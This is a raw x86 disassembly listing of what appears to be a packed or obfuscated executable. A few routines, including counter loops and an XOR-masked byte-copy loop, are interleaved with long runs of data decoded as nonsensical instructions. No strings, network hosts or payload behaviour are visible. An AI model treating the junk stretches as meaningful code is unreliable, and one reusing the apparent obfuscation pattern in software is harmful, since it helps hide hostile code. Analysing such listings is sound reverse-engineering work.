  41034b:	mov    eax,DWORD PTR [ebp+0xc]
  41034e:	pop    esi
  41034f:	leave  
  410350:	ret    0x8
  410353:	push   ebp
  410354:	mov    ebp,esp
  410356:	push   ecx
  410357:	and    DWORD PTR ds:0x43360f,0x0
  410361:	jmp    0x410371
  410366:	mov    eax,ds:0x43360f
  41036b:	inc    eax
  41036c:	mov    ds:0x43360f,eax
  410371:	cmp    DWORD PTR ds:0x43360f,0x11
  410378:	jae    0x4103b4
  41037e:	cmp    DWORD PTR ds:0x43360f,0x9
  410385:	jne    0x410391
  41038b:	call   DWORD PTR ds:0x41203c
  410391:	cmp    DWORD PTR ds:0x43360f,0x8
  410398:	jne    0x4103a9
  41039e:	mov    eax,ds:0x43360f
  4103a3:	inc    eax
  4103a4:	mov    ds:0x43360f,eax
  4103a9:	jmp    0x410366
  4103ae:	xor    DWORD PTR ds:0x43361f,edi
  4103b4:	push   ecx
  4103b5:	add    DWORD PTR ds:0x43367f,0x4336bf
  4103bf:	mov    eax,0xf89c8531
  4103c4:	or     edx,DWORD PTR ds:0x433667
  4103ca:	mov    DWORD PTR [ebp-0x8],eax
  4103cd:	jmp    0x41065e
  4103d2:	jne    0x4103d9
  4103d4:	dec    eax
  4103d5:	cs push 0xee457173
  4103db:	xchg   edx,eax
  4103dc:	or     DWORD PTR [ebp+0x6df12e7],esp
  4103e2:	and    eax,0xea7e7ebd
  4103e7:	jl     0x410467
  4103e9:	jle    0x4103f1
  4103eb:	pop    esp
  4103ec:	sbb    esi,DWORD PTR [edx-0x40]
  4103ef:	mov    ebp,ebp
  4103f1:	and    ah,BYTE PTR [esi]
  4103f3:	and    BYTE PTR [edx-0x2e16934e],0x36
  4103fa:	retf   0x51d
  4103fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4103fe:	xchg   edx,eax
  4103ff:	sub    ah,BYTE PTR [ebp-0x5b]
  410402:	inc    edi
  410403:	js     0x41042f
  410405:	mov    edi,0x55f6f724
  41040a:	in     eax,dx
  41040b:	test   BYTE PTR [edx-0xc],al
  41040e:	les    esi,FWORD PTR [ecx+edx*2+0x44]
  410412:	in     eax,dx
  410413:	lods   al,BYTE PTR ds:[esi]
  410414:	add    ecx,esp
  410416:	sub    ah,0xb6
  410419:	repz dec ecx
  41041b:	aas    
  41041c:	cmc    
  41041d:	shl    BYTE PTR [esi+0x7411a732],cl
  410423:	repnz dec edi
  410425:	mov    bh,0xb9
  410427:	push   esi
  410428:	inc    ecx
  410429:	mov    BYTE PTR [ecx],al
  41042b:	adc    al,0xbb
  41042d:	pop    esi
  41042e:	test   DWORD PTR [eax],ebp
  410430:	cmp    DWORD PTR [ebp+0x48626f16],ebx
  410436:	jp     0x4103d3
  410438:	arpl   di,sp
  41043a:	aaa    
  41043b:	dec    edx
  41043c:	jle    0x4103c8
  41043e:	sbb    esp,edx
  410440:	jns    0x410443
  410442:	pop    es
  410443:	xchg   ebp,eax
  410444:	xchg   ecx,eax
  410445:	add    bh,BYTE PTR [eax-0x7f]
  410448:	jno    0x410455
  41044a:	push   ds
  41044b:	fisttp DWORD PTR [ebx]
  41044d:	out    dx,eax
  41044e:	test   BYTE PTR [esi-0x14],ch
  410451:	ins    DWORD PTR es:[edi],dx
  410452:	int    0x7e
  410454:	lods   eax,DWORD PTR ds:[esi]
  410455:	pop    ss
  410456:	into   
  410457:	jl     0x4103df
  410459:	arpl   WORD PTR [edx],cx
  41045b:	xor    al,0xc
  41045d:	xchg   ebx,eax
  41045e:	jne    0x41046f
  410460:	scas   eax,DWORD PTR es:[edi]
  410461:	inc    edi
  410462:	xchg   BYTE PTR [edi-0x5a],dl
  410465:	(bad)  
  410466:	clts   
  410468:	xchg   ecx,eax
  410469:	aas    
  41046a:	sahf   
  41046b:	jmp    0x1caee969
  410470:	ins    DWORD PTR es:[edi],dx
  410471:	jnp    0x410499
  410473:	leave  
  410474:	xlat   BYTE PTR ds:[ebx]
  410475:	mov    edx,0xd02634c3
  41047a:	xchg   edx,eax
  41047b:	pop    ecx
  41047c:	loopne 0x4104e0
  41047e:	pop    ebp
  41047f:	jp     0x41047b
  410481:	sub    al,0x21
  410483:	fist   DWORD PTR [eax-0x7f]
  410486:	pop    ds
  410487:	jp     0x410410
  410489:	jp     0x41044c
  41048b:	mov    DWORD PTR ds:0x2727c18f,ebx
  410491:	jae    0x4104fa
  410493:	pop    eax
  410494:	xchg   esi,eax
  410495:	inc    eax
  410496:	inc    edx
  410497:	mov    eax,ds:0x2291784f
  41049c:	xor    BYTE PTR [eax],0x26
  41049f:	inc    edi
  4104a0:	sub    BYTE PTR [eax-0x56e2356b],0x5e
  4104a7:	nop
  4104a8:	mov    dh,0x52
  4104aa:	loope  0x41046c
  4104ac:	mov    eax,0x4cc6c2ae
  4104b1:	jp     0x410471
  4104b3:	fld    TBYTE PTR [edx+ecx*8]
  4104b6:	cmp    eax,0x5ad433d2
  4104bb:	mov    ah,0x1e
  4104bd:	or     eax,0x4551ea56
  4104c2:	or     BYTE PTR [ebx-0x80],cl
  4104c5:	fs loopne 0x41049d
  4104c8:	gs dec edx
  4104ca:	cli    
  4104cb:	pop    es
  4104cc:	jo     0x410471
  4104ce:	or     ebx,DWORD PTR [ebp+0x6a4dd4f6]
  4104d4:	loop   0x41046e
  4104d6:	cwde   
  4104d7:	adc    al,0xe5
  4104d9:	call   0xcb17:0xf314fc5c
  4104e0:	or     al,dh
  4104e2:	cmp    esp,DWORD PTR ds:0x9bcd0ea1
  4104e8:	dec    edx
  4104e9:	test   dl,0x9b
  4104ec:	jle    0x41056c
  4104ee:	jl     0x4104b5
  4104f0:	mov    ds:0xcfa2b9b5,al
  4104f5:	sahf   
  4104f6:	ror    BYTE PTR [esi-0x6],0x3c
  4104fa:	pop    edx
  4104fb:	pop    eax
  4104fc:	mov    dh,0x62
  4104fe:	xchg   edi,eax
  4104ff:	(bad)  
  410500:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410501:	xor    al,0x35
  410503:	push   esi
  410504:	lds    esi,FWORD PTR [eax+0x44c027d8]
  41050a:	int    0x8
  41050c:	adc    cl,BYTE PTR [ebx*8-0x7e84c3e7]
  410513:	inc    ebp
  410514:	int    0xf5
  410516:	xor    ch,BYTE PTR [eax+0x48]
  410519:	inc    edi
  41051a:	add    eax,0xd1cf22c3
  41051f:	das    
  410520:	enter  0xd43f,0xa
  410524:	test   al,0xdb
  410526:	push   edi
  410527:	aas    
  410528:	in     eax,0x11
  41052a:	pop    es
  41052b:	icebp  
  41052c:	(bad)  
  41052d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41052e:	xor    eax,0xe2bd6e18
  410533:	out    0x23,eax
  410535:	shr    DWORD PTR [eax],0xcb
  410538:	sub    bh,bh
  41053a:	test   eax,0x259e6cd8
  41053f:	or     edi,DWORD PTR [ecx]
  410541:	xchg   edx,eax
  410542:	jbe    0x41051c
  410544:	dec    esi
  410545:	and    eax,0xe94af286
  41054a:	stos   DWORD PTR es:[edi],eax
  41054b:	xchg   edi,eax
  41054c:	and    al,0x28
  41054e:	test   al,0xb
  410550:	lahf   
  410551:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410552:	and    al,0xbc
  410554:	out    0x55,al
  410556:	pop    ebp
  410557:	outs   dx,DWORD PTR ds:[esi]
  410558:	and    esi,ebx
  41055a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41055b:	(bad)  
  41055c:	into   
  41055d:	sub    ch,BYTE PTR [bp+di+0x5ad8]
  410562:	sub    BYTE PTR [ebp+0x4fe19731],cl
  410568:	mov    ds:0xdbfb5219,al
  41056d:	xchg   edx,eax
  41056e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41056f:	aaa    
  410570:	xor    cl,BYTE PTR [ecx]
  410572:	cwde   
  410573:	push   ss
  410574:	fistp  DWORD PTR [eax]
  410576:	jmp    0xe49b:0x772e1dfc
  41057d:	or     eax,DWORD PTR [edi+0x5a]
  410580:	inc    ebx
  410581:	and    al,0x70
  410583:	adc    eax,DWORD PTR [eax+0x759fafb2]
  410589:	fisub  DWORD PTR [esi+0x6c45b477]
  41058f:	in     eax,dx
  410590:	add    DWORD PTR [ecx-0x7b2fabb1],ecx
  410596:	mov    ch,0xe8
  410598:	int    0xc4
  41059a:	xchg   ecx,eax
  41059b:	add    eax,0x2fecc0fd
  4105a0:	fimul  WORD PTR [eax+0x27]
  4105a3:	inc    esi
  4105a4:	pop    edx
  4105a5:	call   0x1e480c58
  4105aa:	adc    edi,DWORD PTR [ecx]
  4105ac:	xor    al,0xc6
  4105ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4105af:	jmp    0x5403bcab
  4105b4:	jl     0x410587
  4105b6:	test   BYTE PTR [edi-0x336e21f4],ch
  4105bc:	loope  0x41061a
  4105be:	mov    esi,0x8793772
  4105c3:	hlt    
  4105c4:	sbb    eax,0xdfa7ea17
  4105c9:	push   0x6432752a
  4105ce:	sbb    ecx,DWORD PTR [edx+0x27]
  4105d1:	pop    ebp
  4105d2:	lea    ebp,[ebp-0x4f1ec11a]
  4105d8:	out    0x58,al
  4105da:	int    0x96
  4105dc:	ja     0x410647
  4105de:	or     eax,0x212377f0
  4105e3:	sub    DWORD PTR [eax+0x6],ebp
  4105e6:	mov    eax,0xaeaa05a0
  4105eb:	cli    
  4105ec:	data16 lods al,BYTE PTR ds:[esi]
  4105ee:	jp     0x410649
  4105f0:	je     0x410637
  4105f2:	push   esp
  4105f3:	or     bl,BYTE PTR [eax+0x36]
  4105f6:	clc    
  4105f7:	jle    0x410600
  4105f9:	lahf   
  4105fa:	popa   
  4105fb:	sub    DWORD PTR [esi-0x229b60ff],esp
  410601:	sbb    al,0x9f
  410603:	inc    ecx
  410604:	or     BYTE PTR [ecx+ebp*4],dl
  410607:	dec    edx
  410608:	jae    0x41061f
  41060a:	nop
  41060b:	push   esi
  41060c:	into   
  41060d:	or     ch,BYTE PTR [esi-0x4a]
  410610:	xlat   BYTE PTR ds:[ebx]
  410611:	xchg   esp,eax
  410612:	retf   0x6227
  410615:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410616:	jg     0x410682
  410618:	stos   BYTE PTR es:[edi],al
  410619:	mov    edx,0x60bdf1a2
  41061e:	scas   eax,DWORD PTR es:[edi]
  41061f:	and    cl,BYTE PTR [ecx]
  410621:	rol    DWORD PTR [edi+0x73],1
  410624:	inc    edi
  410625:	popa   
  410626:	repnz xchg esi,eax
  410628:	dec    eax
  410629:	add    BYTE PTR [ebx-0x34b218ce],bh
  41062f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410630:	cmp    BYTE PTR [eax+0x293c9de],dl
  410636:	dec    edx
  410637:	or     edx,DWORD PTR [eax]
  410639:	enter  0xb1cf,0x96
  41063d:	dec    esp
  41063e:	in     eax,0xd6
  410640:	cmp    al,0xb5
  410642:	adc    bh,bl
  410644:	xchg   ebx,eax
  410645:	sar    esp,1
  410647:	rep ins BYTE PTR es:[edi],dx
  410649:	jle    0x4105f9
  41064b:	mov    al,0x49
  41064d:	jb     0x41063e
  41064f:	outs   dx,DWORD PTR ss:[esi]
  410651:	push   edx
  410652:	lds    eax,FWORD PTR ds:0x2cb08cd1
  410658:	scas   eax,DWORD PTR es:[edi]
  410659:	mov    bl,al
  41065b:	inc    esp
  41065c:	in     al,0x58
  41065e:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  410665:	and    DWORD PTR ds:0x433613,0x0
  41066f:	mov    edx,DWORD PTR ds:0x433613
  410675:	inc    edx
  410676:	mov    DWORD PTR ds:0x433613,edx
  41067c:	cmp    DWORD PTR ds:0x433613,0x22
  410683:	jne    0x410692
  410689:	push   DWORD PTR [ebp-0x20]
  41068c:	call   DWORD PTR ds:0x412040
  410692:	cmp    DWORD PTR ds:0x433613,0x12
  410699:	jb     0x41066f
  41069f:	xor    edx,edx
  4106a1:	or     edx,DWORD PTR ds:0x4336ef
  4106a7:	sbb    edx,DWORD PTR ds:0x43361b
  4106ad:	mov    DWORD PTR ds:0x4336ef,edx
  4106b3:	mov    edx,DWORD PTR [ebp-0x8]
  4106b6:	mov    DWORD PTR ds:0x433633,0x17
  4106c0:	cmp    DWORD PTR ds:0x433633,0x0
  4106c7:	je     0x410724
  4106cd:	cmp    DWORD PTR ds:0x433633,0xc
  4106d4:	jne    0x4106ee
  4106da:	push   0x4337fc
  4106df:	push   DWORD PTR [ebp-0x1c]
  4106e2:	push   DWORD PTR [ebp-0x18]
  4106e5:	push   DWORD PTR [ebp-0x1c]
  4106e8:	call   DWORD PTR ds:0x4121e8
  4106ee:	cmp    DWORD PTR ds:0x433633,0xd
  4106f5:	jne    0x410708
  4106fb:	mov    ecx,DWORD PTR ds:0x433633
  410701:	dec    ecx
  410702:	mov    DWORD PTR ds:0x433633,ecx
  410708:	mov    ecx,DWORD PTR ds:0x433633
  41070e:	dec    ecx
  41070f:	mov    DWORD PTR ds:0x433633,ecx
  410715:	jmp    0x4106c0
  41071a:	mov    DWORD PTR ds:0x4336f3,0x1fcc
  410724:	push   esi
  410725:	xor    DWORD PTR ds:0x4336b7,ebx
  41072b:	mov    ecx,0x7510854
  410730:	sbb    DWORD PTR ds:0x433617,ecx
  410736:	xor    edx,ecx
  410738:	mov    esi,0x32729b
  41073d:	adc    DWORD PTR ds:0x433627,0x4336ab
  410747:	push   edi
  410748:	mov    edi,DWORD PTR [ebp+0x10]
  41074b:	add    edx,esi
  41074d:	cmp    edi,edx
  41074f:	je     0x410a59
  410755:	mov    edx,DWORD PTR [ebp-0x8]
  410758:	mov    eax,DWORD PTR [ebp-0x4]
  41075b:	xor    eax,ecx
  41075d:	mov    edi,0xffcd8d65
  410762:	sub    edi,eax
  410764:	add    edi,DWORD PTR [ebp+0x10]
  410767:	xor    edx,ecx
  410769:	add    edx,esi
  41076b:	cmp    edx,edi
  41076d:	ja     0x410a54
  410773:	push   ebx
  410774:	jmp    0x41077e
  410779:	mov    esi,0x32729b
  41077e:	mov    eax,DWORD PTR [ebp-0x8]
  410781:	mov    edi,DWORD PTR [ebp-0x4]
  410784:	xor    edi,ecx
  410786:	add    edi,esi
  410788:	mov    esi,DWORD PTR [ebp+0x8]
  41078b:	imul   edi,edx
  41078e:	mov    ebx,DWORD PTR [ebp+0xc]
  410791:	xor    eax,ecx
  410793:	add    eax,edx
  410795:	mov    al,BYTE PTR [ebx+eax*1+0x32729b]
  41079c:	mov    BYTE PTR [edi+esi*1],al
  41079f:	mov    eax,DWORD PTR [ebp-0x4]
  4107a2:	xor    eax,ecx
  4107a4:	lea    edx,[edx+eax*1+0x32729b]
  4107ab:	mov    eax,DWORD PTR [ebp-0x4]
  4107ae:	xor    eax,ecx
  4107b0:	mov    esi,0xffcd8d65
  4107b5:	sub    esi,eax
  4107b7:	add    esi,DWORD PTR [ebp+0x10]
  4107ba:	cmp    edx,esi
  4107bc:	jbe    0x410779
  4107c2:	pop    ebx
  4107c3:	jmp    0x410a54
  4107c8:	out    dx,eax
  4107c9:	adc    al,0x6b
  4107cb:	adc    esi,DWORD PTR [ecx+0x71]
  4107ce:	ja     0x4107c0
  4107d0:	or     DWORD PTR [eax],0x28
  4107d3:	icebp  
  4107d4:	leave  
  4107d5:	xor    al,0x8a
  4107d7:	inc    edi
  4107d8:	xchg   ecx,eax
  4107d9:	mov    ebx,0x7cea7e7e
  4107de:	jle    0x41085e
  4107e0:	pusha  
  4107e1:	std    
  4107e2:	push   es
  4107e3:	pop    ss
  4107e4:	or     al,0xc7
  4107e6:	ds fcmovbe st,st(2)
  4107e9:	loopne 0x410805
  4107eb:	ud2    
  4107ed:	xchg   ecx,eax
  4107ee:	mov    edi,0x4f2ba377
  4107f3:	adc    DWORD PTR [edx],edx
  4107f5:	jmp    0x6b85:0xa7fb501c
  4107fc:	icebp  
  4107fd:	inc    esi
  4107fe:	ss cli 
  410800:	mov    al,0xa3
  410802:	mov    al,0xa2
  410804:	and    dh,cl
  410806:	sahf   
  410807:	(bad)  
  410809:	inc    edi
  41080a:	xchg   ecx,eax
  41080b:	fcom   DWORD PTR [esi+0x6d118788]
  410811:	icebp  
  410812:	xor    DWORD PTR ds:0x74ed7d89,edx
  410818:	pop    ss
  410819:	stc    
  41081a:	ja     0x4107a6
  41081c:	mov    edi,0x272c79b2
  410821:	jle    0x410846
  410823:	dec    ebx
  410824:	mov    ah,0x4d
  410826:	ins    DWORD PTR es:[edi],dx
  410827:	mov    cs,WORD PTR [ebx+0x22d7e765]
  41082d:	and    esp,DWORD PTR [edi+0x3a]
  410830:	mov    ebp,0xb71ab327
  410835:	jno    0x41087d
  410837:	xlat   BYTE PTR ds:[ebx]
  410838:	push   cs
  410839:	push   eax
  41083a:	dec    esi
  41083b:	aad    0x8d
  41083d:	xor    DWORD PTR [edi-0xf],ebx
  410840:	loopne 0x4108a4
  410842:	lahf   
  410843:	dec    esp
  410844:	mov    ds:0x9cc9907b,al
  410849:	out    dx,eax
  41084a:	push   ebp
  41084b:	aad    0x39
  41084d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41084e:	stos   BYTE PTR es:[edi],al
  41084f:	jne    0x410804
  410851:	je     0x41080e
  410853:	mov    ebp,0x7f5cbdf5
  410858:	xor    al,0xfb
  41085a:	lea    ebx,[eax]
  41085c:	pop    ebx
  41085d:	stc    
  41085e:	xor    ah,BYTE PTR es:[eax-0x11]
  410862:	ret    0xa93d
  410865:	and    BYTE PTR [edx-0x1da83f2c],cl
  41086b:	cmp    esi,edx
  41086d:	lds    eax,FWORD PTR [ebp+0x5b234323]
  410873:	push   ebp
  410874:	mov    bl,0xf7
  410876:	sub    eax,0xa4072b8d
  41087b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41087c:	jnp    0x4108c6
  41087e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41087f:	pop    ds
  410880:	ins    DWORD PTR es:[edi],dx
  410881:	std    
  410882:	out    0x53,eax
  410884:	in     al,0x4a
  410886:	jmp    0x5374aa7a
  41088b:	dec    edi
  41088c:	stc    
  41088d:	outs   dx,BYTE PTR ds:[esi]
  41088e:	pusha  
  41088f:	call   0xeed316a6
  410894:	jmp    0xc643db8d
  410899:	fidivr DWORD PTR [ebx-0x1996365e]
  41089f:	dec    esp
  4108a0:	out    0x95,al
  4108a2:	bts    DWORD PTR [ebp+0x101ab2e7],eax
  4108a9:	cmp    al,0x39
  4108ab:	inc    ecx
  4108ac:	retf   
  4108ad:	sbb    bh,BYTE PTR [edx-0x5ce5a90]
  4108b3:	ja     0x4108e2
  4108b5:	mov    eax,0xb3b35fd9
  4108ba:	jmp    0x410863
  4108bc:	add    ah,BYTE PTR [ecx+0x2a]
  4108bf:	mov    bl,0x32
  4108c1:	loop   0x410905
  4108c3:	fwait
  4108c4:	add    ecx,edi
  4108c6:	adc    esp,edx
  4108c8:	and    DWORD PTR [edx+0x2d],ecx
  4108cb:	xor    esp,eax
  4108cd:	(bad)  
  4108ce:	dec    edi
  4108cf:	lahf   
  4108d0:	mov    bl,0xc3
  4108d2:	mov    ah,0x40
  4108d4:	adc    ch,0xf3
  4108d7:	call   0x3b3fc109
  4108dc:	jno    0x410903
  4108de:	ds retf 
  4108e0:	mov    ebx,DWORD PTR [ecx-0x7c]
  4108e3:	or     bh,bh
  4108e5:	mov    esp,0xfb8d071b
  4108ea:	inc    esi
  4108eb:	jbe    0x410921
  4108ed:	sbb    DWORD PTR [edi-0x7f],0x42
  4108f1:	popf   
  4108f2:	or     eax,0x3b332fb4
  4108f7:	leave  
  4108f8:	in     eax,0x2
  4108fa:	sbb    BYTE PTR [ebp-0x32b3f71d],ch
  410900:	push   edx
  410901:	sub    eax,0x24fee307
  410906:	retf   
  410907:	pop    ecx
  410908:	out    0x78,al
  41090a:	sbb    DWORD PTR ds:0x2cd05704,ecx
  410910:	add    bh,BYTE PTR [esi-0x73da81fb]
  410916:	adc    ch,BYTE PTR [edx-0x56ba7d41]
  41091c:	jg     0x410973
  41091e:	mov    eax,0x8805d75e
  410923:	mov    esi,0xd89eaba9
  410928:	gs jo  0x410921
  41092b:	bound  ebx,QWORD PTR [ecx+esi*1+0x7b]
  41092f:	fyl2xp1 
  410931:	test   eax,0x6e229559
  410936:	dec    ebp
  410937:	mov    dh,0x91
  410939:	addr16 inc ecx
  41093b:	dec    edi
  41093c:	and    al,0x3e
  41093e:	loop   0x410983
  410940:	sbb    DWORD PTR [eax-0x72dcef95],edi
  410946:	mov    WORD PTR [esi+0x1fc052ad],?
  41094c:	or     al,BYTE PTR [eax-0x25]
  41094f:	add    BYTE PTR ds:0x7d626e8c,cl
  410955:	ficomp WORD PTR [ebx+0xe]
  410958:	or     eax,0x71385967
  41095d:	in     al,dx
  41095e:	les    esp,FWORD PTR [ebp-0x3c]
  410961:	pop    edx
  410962:	xlat   BYTE PTR ds:[ebx]
  410963:	or     BYTE PTR [ecx],dl
  410965:	pop    ss
  410966:	cmp    eax,0x97da1654
  41096b:	xor    ebx,esi
  41096d:	icebp  
  41096e:	cmp    BYTE PTR [ebx-0x19eb4e4d],0x21
  410975:	mov    al,ds:0xf8f35d25
  41097a:	adc    edi,esi
  41097c:	mov    dh,0x5e
  41097e:	mov    ds:0xc1492bb9,al
  410983:	dec    edx
  410984:	leave  
  410985:	pop    edx
  410986:	mov    eax,ds:0xcb8ccb
  41098b:	push   ds
  41098c:	fsin   
  41098e:	fild   QWORD PTR [edi]
  410990:	out    dx,eax
  410991:	xor    al,0xf
  410993:	aam    0x28
  410995:	es push 0x66
  410998:	scas   al,BYTE PTR es:[edi]
  410999:	or     cl,BYTE PTR [esi-0x41]
  41099c:	mov    ecx,0x660efee5
  4109a1:	add    esp,DWORD PTR [edx+ebx*2-0x72c761b0]
  4109a8:	jo     0x410a1e
  4109aa:	push   0xc1242dfc
  4109af:	sub    esi,DWORD PTR [ecx]
  4109b1:	mov    WORD PTR [esi-0x66267410],gs
  4109b7:	adc    DWORD PTR [eax+0x1a],eax
  4109ba:	mov    ebp,DWORD PTR [ecx]
  4109bc:	les    esi,FWORD PTR [edi-0x1d]
  4109bf:	jmp    0x12bb16a0
  4109c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4109c5:	push   0x68
  4109c7:	retf   
  4109c8:	cwde   
  4109c9:	xor    DWORD PTR [edx-0x257da786],esp
  4109cf:	lea    ebp,[edi]
  4109d1:	or     DWORD PTR [eax-0x352688a5],eax
  4109d7:	mov    BYTE PTR [edx],ah
  4109d9:	add    eax,0x567a67b6
  4109de:	pop    eax
  4109df:	loop   0x4109e3
  4109e1:	xchg   ecx,eax
  4109e2:	pop    esi
  4109e3:	cmp    DWORD PTR [edx+0x4d],esp
  4109e6:	mov    edi,0xca7199fa
  4109eb:	sbb    al,BYTE PTR [ebx-0x2b10e241]
  4109f1:	push   esi
  4109f2:	(bad)  
  4109f3:	cld    
  4109f4:	push   es
  4109f5:	test   eax,0xd03515cc
  4109fa:	mov    DWORD PTR [esi+esi*4-0x73],ebp
  4109fe:	pop    eax
  4109ff:	add    cl,cl
  410a01:	cdq    
  410a02:	ss inc eax
  410a04:	test   BYTE PTR [esi-0x73e9e80],al
  410a0a:	mov    edx,0xc1563ebf
  410a0f:	pop    ecx
  410a10:	outs   dx,BYTE PTR ds:[esi]
  410a11:	xor    DWORD PTR [esi+0x60],edx
  410a14:	nop
  410a15:	xchg   BYTE PTR [ebp-0x79],bl
  410a18:	(bad)  
  410a19:	aad    0x46
  410a1b:	add    al,0x6a
  410a1d:	xor    al,bh
  410a1f:	sub    al,0x1
  410a21:	push   esp
  410a22:	fisttp WORD PTR [edx-0x57]
  410a25:	sbb    bh,BYTE PTR [edx+0x93d99d1]
  410a2b:	pop    eax
  410a2c:	fs jge 0x410a96
  410a2f:	push   edi
  410a30:	ins    DWORD PTR es:[edi],dx
  410a31:	dec    eax
  410a32:	cmp    al,0xb1
  410a34:	dec    esp
  410a35:	dec    ebp
  410a36:	das    
  410a37:	or     al,0x6b
  410a39:	and    DWORD PTR [esi-0x508415e9],esp
  410a3f:	pushf  
  410a40:	adc    ah,BYTE PTR [edi+0x8]
  410a43:	ret    
  410a44:	mov    al,0xc8
  410a46:	bnd call 0xb1d3499
  410a4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a4d:	adc    DWORD PTR [ecx-0x7],ebx
  410a50:	mov    bh,bl
  410a52:	popf   
  410a53:	xor    DWORD PTR [eax-0x7637ace],edi
  410a59:	pop    edi
  410a5a:	pop    esi
  410a5b:	leave  
  410a5c:	ret    0xc
  410a5f:	push   ebp
  410a60:	mov    ebp,esp
  410a62:	mov    eax,DWORD PTR [ebp+0xc]
  410a65:	xor    edx,edx
  410a67:	mov    ecx,0x7264fca9
  410a6c:	div    ecx
  410a6e:	mov    ecx,DWORD PTR [ebp+0x10]
  410a71:	and    ecx,eax
  410a73:	or     ecx,0x81161d8f
  410a79:	mov    eax,ecx
  410a7b:	pop    ebp
  410a7c:	ret    0x18
  410a7f:	push   ebp
  410a80:	mov    ebp,esp
  410a82:	sub    esp,0x58
  410a85:	xor    DWORD PTR ds:0x4336e7,ecx
  410a8b:	mov    ecx,DWORD PTR [ebp+0x8]
  410a8e:	movzx  eax,WORD PTR ds:0x4336bf
  410a95:	sbb    eax,DWORD PTR ds:0x433743
  410a9b:	mov    ds:0x4336bf,eax
  410aa0:	mov    eax,0x8a3c
  410aa5:	xor    ax,WORD PTR [ecx+0x20]
  410aa9:	and    DWORD PTR ds:0x4336b7,0x4336ff
  410ab3:	mov    ecx,0x3b02
  410ab8:	add    ax,cx
  410abb:	and    DWORD PTR ds:0x4336af,0x7f6b
  410ac5:	movzx  eax,ax
  410ac8:	xor    DWORD PTR ds:0x433667,0x6006
  410ad2:	mov    DWORD PTR [ebp-0xc],eax
  410ad5:	mov    BYTE PTR [ebp-0x1],0x7f
  410ad9:	adc    ecx,0x1b78
  410adf:	lea    eax,[ebp-0x1]
  410ae2:	mov    DWORD PTR [ebp-0x10],eax
  410ae5:	adc    ecx,DWORD PTR ds:0x4336f7
  410aeb:	mov    al,BYTE PTR [ebp-0x1]
  410aee:	mov    ecx,DWORD PTR [ebp-0x10]
  410af1:	xor    al,0x46
  410af3:	sub    al,0x38
  410af5:	adc    DWORD PTR ds:0x43362b,0x433637
  410aff:	mov    BYTE PTR [ecx],al
  410b01:	xor    eax,eax
  410b03:	xor    eax,DWORD PTR ds:0x43362b
  410b09:	sbb    DWORD PTR ds:0x433673,eax
  410b0f:	jmp    0x410cab
  410b14:	add    DWORD PTR [ecx-0x1ca338a4],eax
  410b1a:	mov    eax,ds:0xb67bce41
  410b1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b20:	inc    ecx
  410b21:	ins    DWORD PTR es:[edi],dx
  410b22:	inc    esi
  410b23:	scas   al,BYTE PTR es:[edi]
  410b24:	or     eax,0xf17e7e46
  410b29:	jg     0x410ba9
  410b2b:	jle    0x410b36
  410b2d:	int3   
  410b2e:	clc    
  410b2f:	adc    ecx,DWORD PTR [edx+0x2b82c40e]
  410b35:	mov    ecx,0x4d360c82
  410b3a:	push   esp
  410b3b:	xchg   ebp,eax
  410b3c:	pushf  
  410b3d:	ins    DWORD PTR es:[edi],dx
  410b3e:	test   al,0x57
  410b40:	mov    cl,0x98
  410b42:	jae    0x410ade
  410b44:	dec    ecx
  410b45:	add    dh,BYTE PTR [esi+0x3f19783f]
  410b4b:	ret    0x3e21
  410b4e:	pushf  
  410b4f:	or     cl,BYTE PTR [ebp+0x6dcbf159]
  410b55:	add    ah,dl
  410b57:	clc    
  410b58:	adc    DWORD PTR [eax],edx
  410b5a:	sbb    BYTE PTR [esi],ch
  410b5c:	xchg   esp,eax
  410b5d:	sbb    ch,BYTE PTR [ebp+0x2c0fd2ca]
  410b63:	neg    DWORD PTR [edi+0x499ef369]
  410b69:	(bad)  
  410b6a:	push   ebx
  410b6b:	xchg   ebx,eax
  410b6c:	adc    al,0xa3
  410b6e:	mov    bl,0x54
  410b70:	int    0xfe
  410b72:	ret    
  410b73:	cli    
  410b74:	mov    cl,0x96
  410b76:	nop
  410b77:	rcr    BYTE PTR [ebx-0x61],1
  410b7a:	imul   ebp,DWORD PTR [ecx],0xffffffdf
  410b7d:	sub    BYTE PTR [esi+0x3e],ch
  410b80:	stos   BYTE PTR es:[edi],al
  410b81:	push   es
  410b82:	fsub   QWORD PTR [ebx-0x4d87580]
  410b88:	aaa    
  410b89:	inc    edi
  410b8a:	int    0x36
  410b8c:	retf   0x1df
  410b8f:	pop    eax
  410b90:	test   DWORD PTR ds:0x9f71819e,edx
  410b96:	int3   
  410b97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b98:	xchg   BYTE PTR [esi-0x59],bl
  410b9b:	hlt    
  410b9c:	nop
  410b9d:	imul   esp,DWORD PTR [eax+0x2dd3a5ad],0x1d5825b6
  410ba7:	xor    ch,BYTE PTR [edx-0x29]
  410baa:	cmp    bl,BYTE PTR [edi+0x12]
  410bad:	inc    esi
  410bae:	scas   eax,DWORD PTR es:[edi]
  410baf:	sbb    al,0xf0
  410bb1:	jae    0x410b5e
  410bb3:	mov    bl,0x8e
  410bb5:	cmp    al,0xe3
  410bb7:	test   eax,0x9cf98897
  410bbc:	jno    0x410b63
  410bbe:	cmp    bh,BYTE PTR [edx+0x2d]
  410bc1:	int3   
  410bc2:	bound  eax,QWORD PTR ds:0xa71b8f0c
  410bc8:	xchg   esp,eax
  410bc9:	mov    cl,0x4d
  410bcb:	repnz xor al,0x1d
  410bce:	push   ss
  410bcf:	or     ebp,ebp
  410bd1:	cdq    
